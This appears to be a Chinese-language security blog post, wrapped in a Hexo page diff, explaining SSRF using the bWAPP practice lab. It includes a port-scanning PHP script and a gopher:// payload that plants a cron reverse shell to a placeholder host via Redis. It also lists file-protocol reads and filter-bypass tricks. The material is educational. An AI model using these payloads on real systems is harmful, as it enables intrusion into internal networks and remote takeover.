@@ -1,0 +1,535 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"phyb0x.github.io","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="SSRFSSRF利用可以发起网络请求的服务，当做跳板来攻击其他服务。ssrf是穿越防火墙的通行证。(盗图)">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SSRF浅析">
+<meta property="og:url" content="https://phyb0x.github.io/2018/12/25/SSRF%E6%B5%85%E6%9E%90/index.html">
+<meta property="og:site_name" content="p&#39;Blog">
+<meta property="og:description" content="SSRFSSRF利用可以发起网络请求的服务，当做跳板来攻击其他服务。ssrf是穿越防火墙的通行证。(盗图)">
+<meta property="og:locale">
+<meta property="og:image" content="https://i.imgur.com/Cl76cPU.png">
+<meta property="og:image" content="https://i.imgur.com/fYdDSyE.png">
+<meta property="og:image" content="https://i.imgur.com/cyV3zzD.png">
+<meta property="og:image" content="https://i.imgur.com/ECRU8kb.png">
+<meta property="og:image" content="https://i.imgur.com/ckIp36X.png">
+<meta property="article:published_time" content="2018-12-25T09:56:00.000Z">
+<meta property="article:modified_time" content="2019-01-19T02:05:26.000Z">
+<meta property="article:author" content="Yumi">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.imgur.com/Cl76cPU.png">
+
+<link rel="canonical" href="https://phyb0x.github.io/2018/12/25/SSRF%E6%B5%85%E6%9E%90/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh'
+  };
+</script>
+
+  <title>SSRF浅析 | p'Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">p'Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
+    <link itemprop="mainEntityOfPage" href="https://phyb0x.github.io/2018/12/25/SSRF%E6%B5%85%E6%9E%90/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/choumei.png">
+      <meta itemprop="name" content="Yumi">
+      <meta itemprop="description" content="Yumi">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="p'Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          SSRF浅析
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2018-12-25 17:56:00" itemprop="dateCreated datePublished" datetime="2018-12-25T17:56:00+08:00">2018-12-25</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2019-01-19 10:05:26" itemprop="dateModified" datetime="2019-01-19T10:05:26+08:00">2019-01-19</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" itemprop="url" rel="index"><span itemprop="name">基础漏洞总结</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><p>SSRF利用可以发起网络请求的服务，当做跳板来攻击其他服务。ssrf是穿越防火墙的通行证。(盗图)</p>
+<span id="more"></span>
+
+<p><a target="_blank" rel="noopener" href="http://docs.ioin.in/writeup/fuzz.wuyun.org/_src_build_your_ssrf_exp_autowork_pdf/index.pdf">http://docs.ioin.in/writeup/fuzz.wuyun.org/_src_build_your_ssrf_exp_autowork_pdf/index.pdf</a></p>
+<p><img src="https://i.imgur.com/Cl76cPU.png"></p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>利用bWAPP靶机进行演示</p>
+<p>首先可以看到language参数可以发起网络请求</p>
+<p><img src="https://i.imgur.com/fYdDSyE.png"></p>
+<h4 id="内网主机端口嗅探"><a href="#内网主机端口嗅探" class="headerlink" title="内网主机端口嗅探"></a>内网主机端口嗅探</h4><p>这里利用的是靶机自带脚本</p>
+<pre><code>&lt;?php
+
+/*
+
+bWAPP, or a buggy web application, is a free and open source deliberately insecure web application.
+It helps security enthusiasts, developers and students to discover and to prevent web vulnerabilities.
+bWAPP covers all major known web vulnerabilities, including all risks from the OWASP Top 10 project!
+It is for educational purposes only.
+
+Enjoy!
+
+Malik Mesellem
+Twitter: @MME_IT
+
+漏 2013 MME BVBA. All rights reserved.
+
+*/
+
+echo &quot;&lt;script&gt;alert(\&quot;U 4r3 0wn3d by MME!!!\&quot;);&lt;/script&gt;&quot;;
+
+if(isset($_REQUEST[&quot;ip&quot;]))
+&#123;
+
+//list of port numbers to scan
+$ports = array(21, 22, 23, 25, 53, 80, 110, 1433, 3306);
+
+$results = array();
+
+foreach($ports as $port)
+&#123;
+
+if($pf = @fsockopen($_REQUEST[&quot;ip&quot;], $port, $err, $err_string, 1))
+&#123;
+
+$results[$port] = true;
+fclose($pf);
+
+&#125;
+
+else
+&#123;
+
+$results[$port] = false;
+
+&#125;
+
+&#125;
+ 
+foreach($results as $port=&gt;$val)
+&#123;
+
+$prot = getservbyport($port,&quot;tcp&quot;);
+echo &quot;Port $port ($prot): &quot;;
+
+if($val)
+&#123;
+
+echo &quot;&lt;span style=\&quot;color:green\&quot;&gt;OK&lt;/span&gt;&lt;br/&gt;&quot;;
+
+&#125;
+
+else
+&#123;
+
+echo &quot;&lt;span style=\&quot;color:red\&quot;&gt;Inaccessible&lt;/span&gt;&lt;br/&gt;&quot;;
+
+&#125;
+
+&#125;
+
+&#125;
+?&gt;
+</code></pre>
+<p><img src="https://i.imgur.com/cyV3zzD.png"></p>
+<h4 id="打内网redis"><a href="#打内网redis" class="headerlink" title="打内网redis"></a>打内网redis</h4><pre><code>http://192.168.233.130/bWAPP/rlfi.php?language=gopher&amp;i=127.0.0.1&amp;p=6389&amp;query=_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0  
+a%0a%0a*/1%20*%20*%20*%20*%20bash%20-i%20&gt;&amp;%20/dev/tcp/xxx.xxx.xxx.xxx/xxx%200&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d  
+%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3
+%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a&#39;
+</code></pre>
+<p>不过本地没有利用成功</p>
+<h4 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h4><p>利用文件协议读取文件</p>
+<p><img src="https://i.imgur.com/ECRU8kb.png"></p>
+<h4 id="枚举-users-dirs-files"><a href="#枚举-users-dirs-files" class="headerlink" title="枚举(users/dirs/files)"></a>枚举(users/dirs/files)</h4><p>利用burp进行目录枚举，可以用于cms识别，也可以url+paylaod对内网进行攻击。</p>
+<p><img src="https://i.imgur.com/ckIp36X.png"></p>
+<h4 id="Discuz-ssrf-exp"><a href="#Discuz-ssrf-exp" class="headerlink" title="Discuz ssrf exp"></a>Discuz ssrf exp</h4><p><a target="_blank" rel="noopener" href="https://phpinfo.me/2017/02/23/1438.html">https://phpinfo.me/2017/02/23/1438.html</a></p>
+<p>更详细的利用</p>
+<p><a target="_blank" rel="noopener" href="http://blog.safebuff.com/2016/07/03/SSRF-Tips/">http://blog.safebuff.com/2016/07/03/SSRF-Tips/</a></p>
+<h3 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h3><h4 id="web功能"><a href="#web功能" class="headerlink" title="web功能"></a>web功能</h4><pre><code>通过URL地址分享网页内容
+通过url地址加载或下载图片
+图片文章收藏功能
+在线翻译：通过url地址翻译对应文本内容
+未公开的api实现以及其他调用URL的功能
+</code></pre>
+<h4 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h4><pre><code>share
+wap
+url
+link
+src
+source
+target
+u
+3g
+display
+sourceURl    
+imageURL    
+domain
+</code></pre>
+<h4 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h4><pre><code>http://www.baidu.com@10.10.10.10与http://10.10.10.10 请求是相同的
+
+将IP地址转换成二进制
+</code></pre>
+<p>参考连接：</p>
+<p><a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/4747.html">https://www.secpulse.com/archives/4747.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://uknowsec.cn/posts/notes/SSRF%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0.html">https://uknowsec.cn/posts/notes/SSRF%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/20407.html">https://www.freebuf.com/articles/web/20407.html</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2018/12/23/xxe%E6%B5%85%E6%9E%90/" rel="prev" title="xxe浅析">
+      <i class="fa fa-chevron-left"></i> xxe浅析
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2018/12/28/ew%E5%A4%9A%E7%BA%A7%E8%BD%AC%E5%8F%91/" rel="next" title="ew多级转发">
+      ew多级转发 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#SSRF"><span class="nav-number">1.</span> <span class="nav-text">SSRF</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">2.</span> <span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA%E7%AB%AF%E5%8F%A3%E5%97%85%E6%8E%A2"><span class="nav-number">2.1.</span> <span class="nav-text">内网主机端口嗅探</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%89%93%E5%86%85%E7%BD%91redis"><span class="nav-number">2.2.</span> <span class="nav-text">打内网redis</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="nav-number">2.3.</span> <span class="nav-text">读取文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9E%9A%E4%B8%BE-users-dirs-files"><span class="nav-number">2.4.</span> <span class="nav-text">枚举(users&#x2F;dirs&#x2F;files)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Discuz-ssrf-exp"><span class="nav-number">2.5.</span> <span class="nav-text">Discuz ssrf exp</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98"><span class="nav-number">3.</span> <span class="nav-text">漏洞挖掘</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#web%E5%8A%9F%E8%83%BD"><span class="nav-number">3.1.</span> <span class="nav-text">web功能</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%85%B3%E9%94%AE%E5%AD%97"><span class="nav-number">3.2.</span> <span class="nav-text">关键字</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4"><span class="nav-number">3.3.</span> <span class="nav-text">过滤</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Yumi"
+      src="/images/choumei.png">
+  <p class="site-author-name" itemprop="name">Yumi</p>
+  <div class="site-description" itemprop="description">Yumi</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">29</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">categories</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Yumi</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
